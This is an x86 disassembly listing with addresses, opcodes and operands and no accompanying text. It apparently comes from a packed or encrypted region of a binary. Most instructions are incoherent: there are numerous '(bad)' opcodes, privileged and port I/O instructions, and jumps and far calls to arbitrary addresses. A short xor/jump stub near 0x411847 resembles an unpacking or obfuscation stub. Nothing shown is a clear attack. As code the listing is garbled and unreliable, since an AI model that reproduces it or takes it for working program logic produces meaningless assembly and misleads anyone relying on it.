  411165:	cmp    eax,0x62bedf63
  41116a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41116b:	xor    eax,0xd6da8bcc
  411170:	push   ebp
  411171:	ss pop ebp
  411173:	das    
  411174:	jns    0x4111bf
  411176:	imul   esi,DWORD PTR [eax],0xfda122c
  41117c:	cmp    al,0x8b
  41117e:	(bad)  
  411180:	sbb    BYTE PTR [ebp+0x3fed6440],al
  411186:	or     BYTE PTR [esi-0x596c8990],ah
  41118c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41118d:	inc    esi
  41118f:	test   al,0xdd
  411191:	mov    esi,0xf1a5585b
  411196:	push   esp
  411197:	popa   
  411198:	scas   eax,DWORD PTR es:[edi]
  411199:	jle    0x411133
  41119b:	add    dh,BYTE PTR [esi]
  41119d:	into   
  41119e:	mov    esi,0xb914e058
  4111a3:	push   0x2482d833
  4111a8:	mov    bh,BYTE PTR [ebp+0x121b107d]
  4111ae:	(bad)  
  4111af:	outs   dx,BYTE PTR ds:[esi]
  4111b0:	repnz enter 0xb99f,0x8d
  4111b5:	mov    al,0xe0
  4111b7:	aaa    
  4111b8:	fsub   QWORD PTR [ecx-0x6f]
  4111bb:	outs   dx,BYTE PTR ds:[esi]
  4111bc:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4111be:	out    0x1,al
  4111c0:	inc    edi
  4111c1:	ror    BYTE PTR [eax],cl
  4111c3:	aam    0xad
  4111c5:	outs   dx,DWORD PTR ds:[esi]
  4111c6:	aad    0xe5
  4111c8:	jl     0x4111d6
  4111ca:	test   ah,cl
  4111cc:	stos   BYTE PTR es:[edi],al
  4111cd:	(bad)  
  4111ce:	jp     0x4111aa
  4111d0:	cmp    dl,BYTE PTR [eax]
  4111d2:	jae    0x4111c6
  4111d4:	inc    edi
  4111d5:	test   al,0x33
  4111d7:	aaa    
  4111d8:	mov    ch,0x1a
  4111da:	cmc    
  4111db:	sbb    al,0xf0
  4111dd:	and    DWORD PTR [ebp+0x408492f9],0xffffffc5
  4111e4:	mov    DWORD PTR [edi+eax*1],esi
  4111e7:	adc    edx,DWORD PTR [ecx+0x6f]
  4111ea:	int    0xfe
  4111ec:	push   edx
  4111ed:	stos   BYTE PTR es:[edi],al
  4111ee:	into   
  4111ef:	test   DWORD PTR [eax],edi
  4111f1:	cmp    eax,0xb0afae17
  4111f6:	sbb    al,0x76
  4111f8:	jp     0x41125d
  4111fa:	inc    eax
  4111fb:	push   ss
  4111fc:	test   DWORD PTR [ecx+0xa],ebp
  4111ff:	das    
  411200:	pop    ebx
  411201:	pop    esp
  411202:	pushf  
  411203:	retf   0x1533
  411206:	jae    0x411272
  411208:	push   ebp
  411209:	aam    0xd6
  41120b:	fdivrp st(1),st
  41120d:	lods   al,BYTE PTR ds:[esi]
  41120e:	xchg   edx,eax
  41120f:	xor    DWORD PTR [esp+edi*4-0x74d8133d],0x21b08cc6
  41121a:	stos   BYTE PTR es:[edi],al
  41121b:	mov    esp,0xecbd561f
  411220:	xchg   edi,eax
  411221:	addr16 data16 je 0x41121b
  411225:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411226:	repz ret 0xb70e
  41122a:	xchg   ebx,eax
  41122b:	inc    ecx
  41122c:	and    DWORD PTR [ebx],ecx
  41122e:	loop   0x4111b4
  411230:	mov    DWORD PTR [ebx-0x567e3c05],edx
  411236:	sbb    DWORD PTR [esi],esp
  411238:	fs push es
  41123a:	imul   eax,DWORD PTR [ecx+0x2e4330a8],0xffffffab
  411241:	add    BYTE PTR [edx+ebp*2+0x64],ah
  411245:	ins    DWORD PTR es:[edi],dx
  411246:	and    DWORD PTR [edx-0x20],ebx
  411249:	and    eax,0x65dcd918
  41124e:	frstor [edx]
  411250:	jo     0x4111f5
  411252:	jl     0xa34cf0b3
  411258:	mov    edi,0x1ca2922f
  41125d:	jo     0x411247
  41125f:	mov    edx,0x58cfba5
  411264:	cld    
  411265:	addr16 test al,0xe0
  411268:	clc    
  411269:	cmp    ebp,DWORD PTR [edx+0x6d]
  41126c:	or     DWORD PTR [edx+0x58],0xf7c533d
  411273:	aas    
  411274:	arpl   WORD PTR [edi-0x18bef79c],di
  41127a:	jge    0x41123b
  41127c:	cli    
  41127d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41127e:	inc    ebx
  41127f:	lds    edx,FWORD PTR [esi]
  411281:	inc    ebp
  411282:	das    
  411283:	clc    
  411284:	sbb    DWORD PTR [edx+0x44039d4e],edi
  41128a:	mov    eax,ds:0xbecbfe67
  41128f:	xor    eax,0xcf23fba
  411294:	pop    esp
  411295:	shl    edx,cl
  411297:	jbe    0x411223
  411299:	push   esi
  41129a:	gs or  ebp,esi
  41129d:	ror    DWORD PTR [ebx+0x2242d49a],1
  4112a3:	xlat   BYTE PTR ds:[ebx]
  4112a4:	push   cs
  4112a5:	jmp    0x189b5efd
  4112aa:	out    0x7a,al
  4112ac:	mov    ebx,0xbca74cc
  4112b1:	std    
  4112b2:	mov    dh,0xe4
  4112b4:	test   DWORD PTR [edx-0x66ea4ff3],esi
  4112ba:	jmp    0x8b397ba8
  4112bf:	jnp    0x4112f8
  4112c1:	outs   dx,BYTE PTR ds:[esi]
  4112c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112c3:	frstor [esi-0x68]
  4112c6:	push   ds
  4112c7:	inc    ebx
  4112c8:	and    BYTE PTR ds:0xf71027af,bl
  4112ce:	pop    ebx
  4112cf:	mov    ebp,eax
  4112d1:	ret    0xff46
  4112d4:	mov    DWORD PTR [eax],ebp
  4112d6:	sahf   
  4112d7:	pop    esi
  4112d8:	int3   
  4112d9:	sub    DWORD PTR [edx-0x3c],0x6a5606ff
  4112e0:	sub    ch,BYTE PTR fs:[edi+0x1f]
  4112e4:	es fstp st(3)
  4112e7:	mov    ebp,0x7f0e2651
  4112ec:	xchg   ebx,eax
  4112ed:	test   al,dh
  4112ef:	stc    
  4112f0:	data16 fld TBYTE PTR [eax]
  4112f3:	dec    ebx
  4112f4:	dec    eax
  4112f5:	or     esi,DWORD PTR [edx+0x28]
  4112f8:	adc    DWORD PTR [ecx-0x187198bb],esp
  4112fe:	or     DWORD PTR [edx+0x71ad4ed7],esp
  411304:	pusha  
  411305:	dec    ebx
  411306:	xchg   esp,eax
  411307:	dec    ecx
  411308:	mul    BYTE PTR [esi+0xb6c1811]
  41130e:	mov    bl,0x3d
  411310:	sub    ch,BYTE PTR [ebx-0x26]
  411313:	add    edx,DWORD PTR [edi]
  411315:	repnz div DWORD PTR [edx+0x9]
  411319:	and    DWORD PTR [esi+0xd103115],eax
  41131f:	mov    dh,0xc
  411321:	fsubr  DWORD PTR [edi-0x4f]
  411324:	mov    edi,0x4f67cde6
  411329:	enter  0x960f,0xf8
  41132d:	aad    0xba
  41132f:	inc    eax
  411330:	ret    
  411331:	mov    esi,0xacefd444
  411336:	xor    eax,0xf53bdc77
  41133b:	leave  
  41133c:	mov    edx,0xdc31ebab
  411341:	ds push ecx
  411343:	les    esi,FWORD PTR [esi-0x7e]
  411346:	jge    0x411362
  411348:	inc    ebp
  411349:	out    0xd1,eax
  41134b:	into   
  41134c:	push   edi
  41134d:	retf   0x271a
  411350:	loop   0x41138f
  411352:	fbstp  TBYTE PTR [edx-0x2f]
  411355:	mov    ch,0x46
  411357:	push   cs
  411358:	push   edi
  411359:	inc    ebp
  41135a:	call   FWORD PTR ds:0x195970c6
  411360:	mov    bl,0x3b
  411362:	inc    edi
  411363:	push   ss
  411364:	div    BYTE PTR [edi+0x5b27424e]
  41136a:	test   eax,0x5326cc2a
  41136f:	call   DWORD PTR [ebx-0x57dd4646]
  411375:	icebp  
  411376:	add    BYTE PTR [edx],bh
  411378:	add    eax,0x8d390992
  41137d:	sbb    al,0x75
  41137f:	jne    0x4113a5
  411381:	adc    al,0x12
  411383:	(bad)  
  411384:	xlat   BYTE PTR ds:[ebx]
  411385:	shl    DWORD PTR [ebp-0x1c6d5af6],1
  41138b:	loop   0x4113c9
  41138d:	fmul   QWORD PTR [eax]
  41138f:	adc    DWORD PTR [ecx],esp
  411391:	mov    bh,0x1a
  411393:	pop    eax
  411394:	mov    al,0x20
  411396:	stos   DWORD PTR es:[edi],eax
  411397:	retf   0x364a
  41139a:	gs jnp 0x411337
  41139d:	mov    ah,0x25
  41139f:	in     eax,0xb9
  4113a1:	jae    0x4113a5
  4113a3:	jmp    0x41139a
  4113a5:	mov    bl,0x74
  4113a7:	ins    BYTE PTR es:[edi],dx
  4113a8:	pop    esp
  4113a9:	das    
  4113aa:	pop    es
  4113ab:	popf   
  4113ac:	xchg   bp,ax
  4113ae:	jo     0x4113e0
  4113b0:	xchg   BYTE PTR [esi+0x61d33a93],dh
  4113b6:	and    ch,BYTE PTR ds:0x51e4b89a
  4113bc:	inc    ebp
  4113bd:	into   
  4113be:	adc    al,0x35
  4113c0:	xchg   esp,eax
  4113c1:	xor    eax,0x230a5c00
  4113c6:	mov    eax,ds:0x30604b6b
  4113cb:	xchg   esi,eax
  4113cc:	les    edx,FWORD PTR [edi+0x15f02efc]
  4113d2:	push   esp
  4113d3:	aaa    
  4113d4:	lds    ebx,FWORD PTR [eax-0x51]
  4113d7:	mov    eax,0x2a881d62
  4113dc:	daa    
  4113dd:	cmc    
  4113de:	inc    eax
  4113df:	jo     0x4113c0
  4113e1:	(bad)  
  4113e2:	stc    
  4113e3:	sbb    dh,cl
  4113e5:	imul   esi,DWORD PTR [ebp-0x2861cdec],0x3b9be693
  4113ef:	scas   al,BYTE PTR es:[edi]
  4113f0:	xchg   ebx,eax
  4113f1:	ds jne 0x41143e
  4113f4:	push   esp
  4113f5:	cmc    
  4113f6:	retf   
  4113f7:	jp     0x4113b0
  4113f9:	aad    0xe0
  4113fb:	dec    esi
  4113fc:	test   eax,0xe8bdf465
  411401:	mov    eax,ds:0x108126e5
  411406:	xchg   ebp,eax
  411407:	pop    ebp
  411408:	cdq    
  411409:	in     eax,0x6a
  41140b:	jnp    0x41147d
  41140d:	sbb    DWORD PTR [ebx-0xe0c1e07],edi
  411413:	xchg   dh,bl
  411415:	pop    ebx
  411416:	shr    BYTE PTR [edx-0xd458e65],cl
  41141c:	fld    DWORD PTR [edx]
  41141e:	daa    
  41141f:	or     ebp,DWORD PTR [edi-0x5d]
  411422:	sub    al,0x11
  411424:	adc    DWORD PTR [ebp-0xe5cf080],edi
  41142a:	xchg   ecx,eax
  41142b:	jae    0x4113f5
  41142d:	pop    esp
  41142e:	fiadd  WORD PTR [esi+0x1ad53d08]
  411434:	or     bl,BYTE PTR [ecx+0x2e]
  411437:	xchg   edx,eax
  411438:	fimul  DWORD PTR [ecx-0x46f1818f]
  41143e:	retf   
  41143f:	retf   
  411440:	int3   
  411441:	push   ds
  411442:	push   edi
  411443:	inc    eax
  411444:	pop    ss
  411445:	in     eax,0x1
  411447:	aaa    
  411448:	sbb    eax,ecx
  41144a:	or     eax,0x99325046
  41144f:	push   DWORD PTR [edi+0x10]
  411452:	sahf   
  411453:	imul   esi,DWORD PTR [ebp-0x5d8ab2ff],0x816c82cc
  41145d:	leave  
  41145e:	pop    eax
  41145f:	xchg   edi,eax
  411460:	xor    al,0x1d
  411462:	mov    esi,0x980582f8
  411467:	retf   
  411468:	dec    esp
  411469:	and    al,0x20
  41146b:	popa   
  41146c:	inc    eax
  41146d:	xor    eax,edx
  41146f:	and    BYTE PTR [ecx+0x36],ah
  411472:	sbb    al,BYTE PTR [eax+0x1b]
  411475:	test   DWORD PTR [edi-0x26],ebx
  411478:	leave  
  411479:	out    dx,al
  41147a:	out    0xa4,eax
  41147c:	push   0x16bbec40
  411481:	push   esp
  411482:	pusha  
  411483:	xor    DWORD PTR [esi],ebx
  411485:	adc    BYTE PTR [edx-0x29184544],al
  41148b:	out    dx,al
  41148c:	cs fcmove st,st(3)
  41148f:	and    DWORD PTR [esi+0x73],0x8d38dd25
  411496:	add    esp,ecx
  411498:	mov    bh,0xfa
  41149a:	rol    BYTE PTR es:[ecx+0x3a],cl
  41149e:	inc    eax
  41149f:	bound  ecx,QWORD PTR [ebp+edx*8+0x3c]
  4114a3:	idiv   DWORD PTR [eax]
  4114a5:	and    eax,0x141f1cb7
  4114aa:	mov    ds:0x3ff5b3ae,al
  4114af:	ins    DWORD PTR es:[edi],dx
  4114b0:	sbb    DWORD PTR [eax+0x25],0x51
  4114b4:	div    ch
  4114b6:	and    eax,0xb0464965
  4114bb:	pop    edx
  4114bc:	ja     0x411495
  4114be:	mov    ebp,0x6bf4c747
  4114c3:	or     BYTE PTR [edi+0xbf68a28],ah
  4114c9:	retf   0xc8b6
  4114cc:	std    
  4114cd:	push   ds
  4114ce:	mov    edi,0xf90f6168
  4114d3:	sub    eax,0x5e2f5bdb
  4114d8:	pushf  
  4114d9:	mov    eax,ds:0xc487d5cb
  4114df:	outs   dx,DWORD PTR ds:[esi]
  4114e0:	pushf  
  4114e1:	int    0x79
  4114e3:	mov    edx,0xf0cc9439
  4114e8:	jae    0x4114d6
  4114ea:	lea    edi,[edi]
  4114ec:	mov    ebp,DWORD PTR [ebp-0x1b]
  4114ef:	cmp    eax,0xb7bd905d
  4114f4:	pop    ds
  4114f5:	scas   eax,DWORD PTR es:[edi]
  4114f6:	jo     0x41156a
  4114f8:	nop
  4114f9:	mov    cl,0x26
  4114fb:	push   edx
  4114fc:	rcr    DWORD PTR [edi],cl
  4114fe:	pusha  
  4114ff:	pop    ss
  411500:	jg     0x41155c
  411502:	sahf   
  411503:	xchg   edx,eax
  411504:	push   ds
  411505:	mov    cl,0x8e
  411507:	inc    edx
  411508:	loope  0x411517
  41150a:	(bad)  
  41150b:	add    BYTE PTR fs:[edi+ebx*1],0x9a
  411510:	imul   ebx,DWORD PTR [ebx+0x5],0xe0efff1d
  411517:	push   ebx
  411518:	adc    DWORD PTR [ecx+0x1b2bc58],0xdcc44fce
  411522:	fbld   TBYTE PTR [ebx-0x4d46e249]
  411528:	xchg   ecx,eax
  411529:	or     DWORD PTR [edx+0x1e953b3d],edi
  41152f:	mov    dh,BYTE PTR [eax+0x1c016a1c]
  411535:	push   ebx
  411536:	test   al,0xa9
  411538:	fwait
  411539:	ret    0xc7fe
  41153c:	mov    bl,0x9a
  41153e:	sbb    ah,BYTE PTR [ebx]
  411540:	push   edx
  411541:	loope  0x4114f1
  411543:	test   BYTE PTR [ebx],bl
  411545:	jp     0x41153a
  411547:	fdiv   DWORD PTR ds:0x19f732cf
  41154d:	adc    DWORD PTR [ebx+0x1b],edx
  411550:	cld    
  411551:	or     al,0x1e
  411553:	js     0x4115a8
  411555:	daa    
  411556:	in     eax,dx
  411557:	jb     0x411549
  411559:	add    DWORD PTR [eax-0x6a],ecx
  41155c:	fdivr  st,st(0)
  41155e:	xchg   BYTE PTR [ebx],bl
  411560:	xchg   BYTE PTR [eax+0x7f30ddfb],ch
  411566:	mov    bh,0x68
  411568:	je     0x4115c4
  41156a:	test   BYTE PTR [ecx-0x78eccefe],bl
  411570:	or     dl,BYTE PTR [ebx]
  411572:	pop    esp
  411573:	les    ecx,FWORD PTR [esi]
  411575:	mov    ds:0x714db456,al
  41157a:	imul   ebx,DWORD PTR [edx-0x70],0xccf5f7c9
  411581:	ret    0x2060
  411584:	sub    al,0x64
  411586:	(bad)  
  411587:	jnp    0x4115ed
  411589:	dec    ecx
  41158a:	mov    bh,0x2b
  41158c:	push   0x654c3cac
  411591:	xor    al,0xc5
  411593:	bound  ebx,QWORD PTR [ecx+0x4b84c08c]
  411599:	ret    0xd659
  41159c:	sbb    BYTE PTR [eax+edx*2],0xfe
  4115a0:	fsubrp st(5),st
  4115a2:	pop    esp
  4115a3:	or     al,0xca
  4115a5:	fwait
  4115a6:	ret    0x5197
  4115a9:	out    dx,al
  4115aa:	scas   eax,DWORD PTR es:[edi]
  4115ab:	inc    esp
  4115ac:	scas   eax,DWORD PTR es:[edi]
  4115ad:	ss add eax,0x38e2c2e7
  4115b3:	fldcw  WORD PTR [edi]
  4115b5:	mov    fs,WORD PTR [esi+0x70ac16d8]
  4115bb:	sub    ecx,edi
  4115bd:	push   0x6f830ea5
  4115c2:	and    al,0x8a
  4115c4:	pop    ebp
  4115c5:	call   0xd2b72ceb
  4115ca:	iret   
  4115cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115cc:	xor    DWORD PTR [eax-0x2c],0xbbc6862
  4115d3:	mov    eax,ds:0x3e46d62
  4115d8:	into   
  4115d9:	jp     0x411611
  4115db:	add    esp,DWORD PTR [esi-0x4b31d671]
  4115e1:	bound  ebx,QWORD PTR [edx]
  4115e3:	int3   
  4115e4:	push   cs
  4115e5:	mov    ebx,0x5635a321
  4115ea:	outs   dx,DWORD PTR ds:[esi]
  4115eb:	ins    BYTE PTR es:[edi],dx
  4115ec:	push   edi
  4115ed:	add    al,0x52
  4115ef:	add    dl,cl
  4115f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115f2:	and    dh,BYTE PTR [eax+eiz*2]
  4115f5:	cwde   
  4115f6:	int    0x53
  4115f8:	push   0x3c3be10e
  4115fd:	iret   
  4115fe:	and    eax,0xc54b1651
  411603:	rcl    DWORD PTR [edi+esi*2+0x7c],cl
  411607:	xchg   edi,eax
  411608:	into   
  411609:	into   
  41160a:	or     ch,BYTE PTR [ecx-0x2cfafd79]
  411610:	sub    DWORD PTR [ecx+0x54b4d579],esp
  411616:	ds add eax,0x80aa8ec9
  41161c:	push   0x1b
  41161e:	pop    ebp
  41161f:	push   ss
  411620:	ins    BYTE PTR es:[edi],dx
  411621:	cdq    
  411622:	jl     0x4115fd
  411624:	imul   DWORD PTR [ebx+0x2e]
  411627:	mov    cs:0xd6858d14,al
  41162d:	ss add eax,0xce5a537d
  411633:	imul   edx,ebp,0xfffffff5
  411636:	xor    al,0xe
  411638:	sbb    al,0x21
  41163a:	aam    0xa3
  41163c:	int    0xae
  41163e:	mov    esp,0x329d748a
  411643:	inc    edi
  411644:	or     BYTE PTR [esi-0x50074948],0xbb
  41164b:	shl    BYTE PTR [edx-0x6e977ae9],0x1
  411652:	mov    bh,0xc4
  411654:	not    BYTE PTR [edx+0x69]
  411657:	imul   edx,ebx,0x47
  41165a:	sbb    DWORD PTR [ecx+0x6d],esp
  41165d:	js     0x4115f6
  41165f:	sub    ebp,ecx
  411661:	push   0xffffffd0
  411663:	push   0xffffffb6
  411665:	jb     0x41165a
  411667:	(bad)  
  411668:	pop    esi
  411669:	aas    
  41166a:	retf   
  41166b:	sti    
  41166c:	push   ss
  41166d:	sub    al,0xc9
  41166f:	mov    al,0x7d
  411671:	adc    BYTE PTR [ecx+ebx*1],0xcf
  411675:	push   ebp
  411676:	mov    dh,0x46
  411678:	out    dx,eax
  411679:	pop    es
  41167a:	data16 hlt 
  41167c:	mov    esi,DWORD PTR [eax]
  41167e:	mov    al,0x71
  411680:	adc    DWORD PTR [edx-0xf],ecx
  411683:	dec    esp
  411684:	mov    ebx,esi
  411686:	dec    ebp
  411687:	add    edi,eax
  411689:	adc    ebp,0x7a
  41168c:	add    bl,dh
  41168e:	loop   0x41168c
  411690:	cmp    esi,DWORD PTR [eax+0x40d881f1]
  411696:	hlt    
  411697:	xor    al,0xc3
  411699:	xchg   edx,eax
  41169a:	mov    al,ds:0x72a5072d
  41169f:	(bad)  
  4116a0:	and    DWORD PTR [eax+0x5d],ecx
  4116a3:	xor    dh,BYTE PTR [ecx-0x1e]
  4116a6:	dec    ebp
  4116a7:	aas    
  4116a8:	push   ss
  4116a9:	mul    BYTE PTR [esi+0x5113128b]
  4116af:	sbb    ebx,DWORD PTR [ebx+0x1b]
  4116b2:	fidivr WORD PTR ds:0xd5413636
  4116b8:	and    BYTE PTR [eax-0x5e115dab],0x7a
  4116bf:	stos   DWORD PTR es:[edi],eax
  4116c0:	xchg   esi,eax
  4116c1:	rcl    BYTE PTR [esi],cl
  4116c3:	cli    
  4116c4:	xchg   cl,bh
  4116c6:	pop    eax
  4116c7:	adc    edi,DWORD PTR [ecx+ecx*1]
  4116ca:	fldenv [esi+ecx*1+0x3c4a7d74]
  4116d1:	jp     0x41173f
  4116d3:	test   eax,0x57d55f41
  4116d8:	inc    esp
  4116d9:	pop    ecx
  4116da:	push   edx
  4116db:	popf   
  4116dc:	fisubr WORD PTR [eax+0x27d3befe]
  4116e2:	(bad)  
  4116e3:	ds ins DWORD PTR es:[edi],dx
  4116e5:	push   DWORD PTR [esi+0x7a]
  4116e8:	icebp  
  4116e9:	or     DWORD PTR [edi-0x78],esp
  4116ec:	adc    DWORD PTR es:[edi],esi
  4116ef:	aas    
  4116f0:	scas   al,BYTE PTR es:[edi]
  4116f1:	pop    ecx
  4116f2:	test   eax,0x48ec22a4
  4116f7:	bound  ebp,QWORD PTR [esi]
  4116f9:	sub    DWORD PTR [edi-0x529ebde8],ebx
  4116ff:	sub    dl,ah
  411701:	sub    al,0x7e
  411703:	pop    edi
  411704:	jg     0x4116c3
  411706:	mov    ch,0x55
  411708:	sub    bh,BYTE PTR [edi]
  41170a:	bound  edx,QWORD PTR [ecx-0x63]
  41170d:	jo     0x41178b
  41170f:	mov    ebp,0x4f99b184
  411714:	das    
  411715:	cmp    eax,0x16cb3f54
  41171a:	dec    edx
  41171b:	lock pop edx
  41171d:	cld    
  41171e:	sti    
  41171f:	test   eax,esp
  411721:	dec    esp
  411722:	mov    ds:0xeb1978ba,eax
  411727:	in     eax,0x9d
  411729:	xchg   edx,eax
  41172a:	push   edx
  41172b:	shr    DWORD PTR [edi+esi*8+0x46],1
  41172f:	and    esp,DWORD PTR [ebx+0x2b]
  411732:	fwait
  411733:	sub    ax,0xfa5e
  411737:	mov    dh,0xb1
  411739:	and    eax,0xce85a843
  41173e:	cld    
  41173f:	xor    ch,BYTE PTR [ebx]
  411741:	inc    ecx
  411742:	jg     0x4116f0
  411744:	pcmpgtw mm5,mm2
  411747:	push   ebp
  411748:	addr16 loopne 0x41171c
  41174b:	xor    sp,WORD PTR [esi-0x4d]
  41174f:	dec    esi
  411750:	and    BYTE PTR [edi-0x25],ah
  411753:	jo     0x41175e
  411755:	xchg   ecx,eax
  411756:	(bad)  
  411757:	pop    edx
  411758:	popa   
  411759:	xor    eax,0x332e08b
  41175e:	in     eax,0xce
  411760:	das    
  411761:	lahf   
  411762:	fnstsw WORD PTR [ebp-0x3]
  411765:	jmp    0x41175e
  411767:	shl    ecx,cl
  411769:	adc    eax,0x527c0e2b
  41176e:	rcl    BYTE PTR [eax],0x8a
  411771:	int3   
  411772:	mov    edx,0x7c0575f
  411777:	sbb    BYTE PTR [esi],ah
  411779:	xor    eax,0xe4e2d5e9
  41177e:	test   BYTE PTR [ebx-0x2d],0xd4
  411782:	and    al,bl
  411784:	mov    eax,ds:0x2a1c765d
  411789:	xor    ecx,DWORD PTR [ebp+0x3d]
  41178c:	(bad)  
  41178e:	out    dx,eax
  41178f:	mov    ecx,0xa67b8c75
  411794:	arpl   sp,dx
  411796:	dec    edi
  411797:	cmc    
  411798:	mov    eax,ds:0x74451968
  41179d:	sub    eax,0xffa30456
  4117a2:	int3   
  4117a3:	arpl   WORD PTR [esi],bp
  4117a5:	or     ecx,esi
  4117a7:	sbb    eax,0x140dd3f0
  4117ac:	pop    es
  4117ad:	jno    0x411759
  4117af:	imul   ebp,DWORD PTR [esi-0x1a],0xffffffed
  4117b3:	pop    ecx
  4117b4:	outs   dx,BYTE PTR ds:[esi]
  4117b5:	pop    ecx
  4117b6:	jg     0x411786
  4117b8:	mov    ch,0x78
  4117ba:	imul   esp,DWORD PTR [esi],0xffffffe9
  4117bd:	pop    edi
  4117be:	rol    BYTE PTR [ebp-0x623802a3],0xad
  4117c5:	jb     0x4117e0
  4117c7:	inc    edi
  4117c8:	or     al,0xbe
  4117ca:	push   0xe737f22c
  4117cf:	je     0x41181d
  4117d1:	mov    ch,0x18
  4117d3:	fdiv   QWORD PTR [ecx+0x2a]
  4117d6:	(bad)  
  4117d7:	(bad)  
  4117d8:	out    0x78,al
  4117da:	mov    edi,0x4142709e
  4117df:	cdq    
  4117e0:	addr16 add al,0xf7
  4117e3:	ret    
  4117e4:	ins    DWORD PTR es:[edi],dx
  4117e5:	jg     0x411770
  4117e7:	out    dx,eax
  4117e8:	cmp    ah,BYTE PTR [ebx]
  4117ea:	(bad)  
  4117eb:	in     eax,0xf8
  4117ed:	or     al,0xa0
  4117ef:	add    al,0x4d
  4117f1:	test   BYTE PTR [edi+0x507a7f8b],cl
  4117f7:	xor    esp,DWORD PTR [esi+0x61]
  4117fa:	dec    ebp
  4117fb:	imul   esp,DWORD PTR [eax],0x47
  4117fe:	inc    ebx
  4117ff:	dec    edx
  411800:	imul   edi,DWORD PTR [ebx-0x24],0x3e
  411804:	in     eax,dx
  411805:	pop    ds
  411806:	jp     0x41181a
  411808:	jl     0x411842
  41180a:	mov    cl,0xc
  41180c:	jecxz  0x41186f
  41180e:	retf   0xa708
  411811:	jbe    0x411854
  411813:	jbe    0x4117e6
  411815:	cld    
  411816:	pop    esp
  411817:	pop    ebp
  411818:	mov    ah,bl
  41181a:	jle    0x411841
  41181c:	fadd   DWORD PTR [edx+esi*4-0xe]
  411820:	not    BYTE PTR [esi+0x4d1ae597]
  411826:	inc    DWORD PTR [esi]
  411828:	xlat   BYTE PTR ds:[ebx]
  411829:	gs or  al,0x9f
  41182c:	jp     0x4117c2
  41182e:	push   eax
  41182f:	mov    esp,0x34e8b6e2
  411834:	or     ebp,edx
  411836:	and    BYTE PTR [edi-0x43],dl
  411839:	cmp    DWORD PTR [esi+0x79],0x5b127381
  411840:	loopne 0x41180f
  411842:	test   DWORD PTR [ecx-0x4d],ebp
  411845:	pop    ds
  411846:	(bad)  
  411847:	xor    ebx,ebx
  411849:	add    esi,ecx
  41184b:	adc    ebx,0xffffffff
  41184e:	xor    edi,edi
  411850:	xor    esi,eax
  411852:	xor    ebx,0x0
  411855:	jmp    0x413be9
  41185a:	pop    ss
  41185b:	push   edx
  41185c:	mov    al,0x83
  41185f:	aam    0xe3
  411861:	imul   ebx,DWORD PTR [eax+0x68],0xae69ba54
  411868:	cmp    eax,0x626af476
  41186d:	(bad)  
  41186e:	jmp    0x4118cf
  411870:	bound  esp,QWORD PTR [edx+0x5f]
  411873:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411874:	xchg   DWORD PTR [ecx+esi*4+0x3514fb7d],eax
  41187b:	inc    esi
  41187c:	je     0x411833
  41187e:	mov    eax,0x2cc55bd8
  411883:	ins    DWORD PTR es:[edi],dx
  411884:	es in  al,0x41
  411887:	(bad)  
  411888:	loop   0x4118ef
  41188a:	mov    ds:0xbe65fa8b,al
  41188f:	dec    edi
  411890:	fadd   DWORD PTR [ebx-0x38]
  411893:	mov    ecx,0x1894f67c
  411898:	hlt    
  411899:	push   edi
  41189a:	jne    0x411865
  41189c:	add    edi,0xa947d1b1
  4118a2:	sar    DWORD PTR [edi+0x74],cl
  4118a5:	jmp    0xd501:0xe1782bd9
  4118ac:	cmp    WORD PTR [eax-0x74],ax
  4118b0:	mov    cl,0x1f
  4118b2:	jecxz  0x4118d5
  4118b4:	arpl   di,bx
  4118b6:	inc    eax
  4118b7:	dec    ecx
  4118b8:	daa    
  4118b9:	cdq    
  4118ba:	xchg   ebp,eax
  4118bb:	cmp    DWORD PTR [ebx],0x3ac8dedf
  4118c1:	pop    es
  4118c2:	scas   eax,DWORD PTR es:[edi]
  4118c3:	dec    esp
  4118c4:	arpl   WORD PTR [ecx-0x493c1237],sp
  4118ca:	stos   BYTE PTR es:[edi],al
  4118cb:	das    
  4118cc:	scas   eax,DWORD PTR es:[edi]
  4118cd:	shld   eax,esi,0xe
  4118d1:	jnp    0x41190d
  4118d3:	or     BYTE PTR ds:0x6523e25,ah
  4118d9:	dec    esp
  4118da:	dec    edx
  4118db:	inc    ebp
  4118dc:	or     DWORD PTR [edx-0x539aab0d],ebp
  4118e2:	mov    cl,0x35
  4118e4:	or     ch,ah
  4118e6:	push   esi
  4118e7:	ret    
  4118e8:	pop    ebp
  4118e9:	mov    ds:0x87c1e6bb,eax
  4118ee:	add    esi,DWORD PTR [edi+esi*4-0x39]
  4118f2:	mov    al,0xdd
  4118f4:	sahf   
  4118f5:	loop   0x4118da
  4118f7:	loope  0x411903
  4118f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118fa:	or     eax,0xb303fd8c
  4118ff:	hlt    
  411900:	lock mov edx,0x99114b6d
  411906:	and    edi,esp
  411908:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411909:	jne    0x41196e
  41190b:	or     eax,0x54f0a3cb
  411910:	aaa    
  411911:	clc    
  411912:	popa   
  411913:	popa   
  411914:	and    BYTE PTR [edi-0x49],ah
  411917:	jp     0x411974
  411919:	adc    DWORD PTR [ebx-0x15741c94],esi
  41191f:	gs xor al,0x9f
  411922:	pushf  
  411923:	cmp    eax,0x4857108e
  411928:	add    BYTE PTR [ecx-0x1aa463],bl
  41192e:	cmp    al,0x3d
  411930:	imul   esi,DWORD PTR [ebx-0x27],0x75
  411934:	inc    edx
  411935:	or     BYTE PTR [ebx+0x26],dl
  411938:	cmp    DWORD PTR [ecx+0x40],ebp
  41193b:	xchg   esi,eax
  41193c:	push   es
  41193d:	dec    BYTE PTR [edi+0x395fec17]
  411943:	adc    al,0xa6
  411945:	jmp    0x4118c7
  411947:	mov    esp,0x72396d0c
  41194c:	cmp    dl,BYTE PTR [esi+0x37871c3c]
  411952:	mov    eax,gs:0x88f5df88
  411958:	cs call 0x6043:0x4ec77514
  411960:	xchg   esp,eax
  411961:	loopne 0x4119aa
  411963:	dec    esp
  411964:	dec    esi
